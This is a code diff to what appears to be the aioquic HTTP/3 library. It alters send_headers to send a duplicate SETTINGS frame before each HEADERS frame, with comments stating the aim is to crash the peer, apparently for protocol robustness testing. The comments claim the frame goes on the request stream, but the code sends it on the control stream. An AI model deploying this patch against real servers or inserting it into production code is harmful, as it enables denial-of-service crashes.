@@ -457,6 +457,7 @@ class H3Connection:
             stream_id, encode_frame(FrameType.DATA, data), end_stream
         )
 
+# Sending SETTINGS Frame on Request Stream to create a crash
     def send_headers(
         self, stream_id: int, headers: Headers, end_stream: bool = False
     ) -> None:
@@ -488,14 +489,24 @@ class H3Connection:
                 ),
             )
 
-        # update state and send headers
+        # update state
         if stream.headers_send_state == HeadersState.INITIAL:
             stream.headers_send_state = HeadersState.AFTER_HEADERS
         else:
             stream.headers_send_state = HeadersState.AFTER_TRAILERS
+
+        # Sending SETTINGS Frame on Request Stream to create a crash:
+        self._sent_settings = self._get_local_settings()
+        self._quic.send_stream_data(
+            self._local_control_stream_id,
+            encode_frame(FrameType.SETTINGS, encode_settings(self._sent_settings, self._cap_buffer)),
+        )
+
+        # Send headers
         self._quic.send_stream_data(
             stream_id, encode_frame(FrameType.HEADERS, frame_data), end_stream
         )
+
 
     @property
     def received_settings(self) -> Optional[Dict[int, int]]:
@@ -719,6 +730,8 @@ class H3Connection:
             )
 
         return http_events
+
+    
 
     def _init_connection(self) -> None:
         # send our settings
